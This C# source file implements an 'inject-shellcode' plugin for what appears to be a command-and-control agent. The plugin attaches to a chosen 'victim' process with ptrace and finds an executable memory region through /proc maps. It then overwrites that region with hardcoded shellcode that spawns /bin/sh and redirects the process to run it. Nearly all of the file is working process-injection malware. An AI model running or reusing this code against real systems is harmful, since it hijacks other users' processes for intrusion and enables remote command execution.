using Agent.Interfaces;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Agent.Utilities;
using Microsoft.Win32.SafeHandles;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "inject-shellcode";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private ISpawner spawner { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
            this.spawner = spawner;
        }

        public async Task Execute(ServerJob job)
        {
            Console.WriteLine(job.task.parameters);
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);

            if (!args.Validate(out var message))
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);

            int pidMax = GetProcPidMax();
            //long victimPid = Convert.ToInt64(args[0]);
            long victimPid = (long)args.pid;
            if (victimPid == 0 || victimPid > pidMax)
            {
                await messageManager.WriteLine("Argument not a valid number. Aborting.", job.task.id, true, "error");
                return;
            }

            // Attach to the victim process.
            if (PTrace.PtraceAttach(victimPid) < 0)
            {
                await messageManager.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                return;
            }
            PTrace.Wait(null);

            await messageManager.WriteLine($"[*] Attach to the process with PID {victimPid}.", job.task.id, false);

            // Save old register state.
            PTrace.UserRegs oldRegs;
            if (PTrace.PtraceGetRegs(victimPid, out oldRegs) < 0)
            {
                await messageManager.WriteLine($"Failed to PTRACE_GETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                return;
            }

            long address = ParseMapsFile(victimPid);

            int payloadSize = SHELLCODE.Length;
            ulong[] payload = new ulong[payloadSize / 8];

            await messageManager.WriteLine($"[*] Injecting payload at address 0x{address:X}.", job.task.id, false);

            for (int i = 0; i < payloadSize; i += 8)
            {
                ulong value = BitConverter.ToUInt64(SHELLCODE, i);
                if (PTrace.PtracePokeText(victimPid, address + i, value) < 0)
                {
                    await messageManager.WriteLine($"Failed to PTRACE_POKETEXT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                    return;
                }
            }

            await messageManager.WriteLine("[*] Jumping to the injected code.", job.task.id, true, "error");
            PTrace.UserRegs regs = oldRegs;
            regs.rip = (ulong)address;

            if (PTrace.PtraceSetRegs(victimPid, regs) < 0)
            {
                await messageManager.WriteLine($"Failed to PTRACE_SETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                return;
            }

            if (PTrace.PtraceCont(victimPid, IntPtr.Zero) < 0)
            {
                await messageManager.WriteLine($"Failed to PTRACE_CONT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                return;
            }

            await messageManager.WriteLine("[*] Successfully injected and jumped to the code.", job.task.id, true);


        }
        const int PID_MAX = 32768;
        const int PID_MAX_STR_LENGTH = 64;

        // http://shell-storm.org/shellcode/files/shellcode-806.php
        static readonly byte[] SHELLCODE = new byte[]
        {
        0x31, 0xC0, 0x48, 0xBB, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xF7,
        0xDB, 0x53, 0x54, 0x5F, 0x99, 0x52, 0x57, 0x54, 0x5E, 0xB0, 0x3B, 0x0F, 0x05
        };

        private int GetProcPidMax()
        {
            string pidMaxFilePath = "/proc/sys/kernel/pid_max";

            try
            {
                using (StreamReader pidMaxFile = new StreamReader(pidMaxFilePath))
                {
                    return int.Parse(pidMaxFile.ReadToEnd());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading {pidMaxFilePath}: {ex.Message}");
                Console.WriteLine("Using default.");
                return PID_MAX;
            }
        }

        private string GetPermissionsFromLine(string line)
        {
            int firstSpace = -1;
            int secondSpace = -1;

            for (int i = 0; i < line.Length; i++)
            {
                if (line[i] == ' ' && firstSpace == -1)
                {
                    firstSpace = i + 1;
                }
                else if (line[i] == ' ' && firstSpace != -1)
                {
                    secondSpace = i;
                    break;
                }
            }

            if (firstSpace != -1 && secondSpace != -1 && secondSpace > firstSpace)
            {
                return line.Substring(firstSpace, secondSpace - firstSpace);
            }

            return null;
        }

        private long GetAddressFromLine(string line)
        {
            int addressLastOccurrenceIndex = -1;

            for (int i = 0; i < line.Length; i++)
            {
                if (line[i] == '-')
                {
                    addressLastOccurrenceIndex = i;
                }
            }

            if (addressLastOccurrenceIndex == -1)
            {
                Console.WriteLine($"Could not parse address from line '{line}'. Aborting.");
                return -1;
            }

            string addressLine = line.Substring(0, addressLastOccurrenceIndex);
            return Convert.ToInt64(addressLine, 16);
        }

        private long ParseMapsFile(long victimPid)
        {
            string mapsFileName = $"/proc/{victimPid}/maps";

            try
            {
                using (StreamReader mapsFile = new StreamReader(mapsFileName))
                {
                    string line;
                    while ((line = mapsFile.ReadLine()) != null)
                    {
                        string permissions = GetPermissionsFromLine(line);

                        if (permissions == null)
                        {
                            continue;
                        }
                        else if (permissions.StartsWith("r-xp"))
                        {
                            Console.WriteLine($"[*] Found section mapped with {permissions} permissions.");
                            return GetAddressFromLine(line);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error opening {mapsFileName} file: {ex.Message}");
            }

            return -1;
        }
    }
}
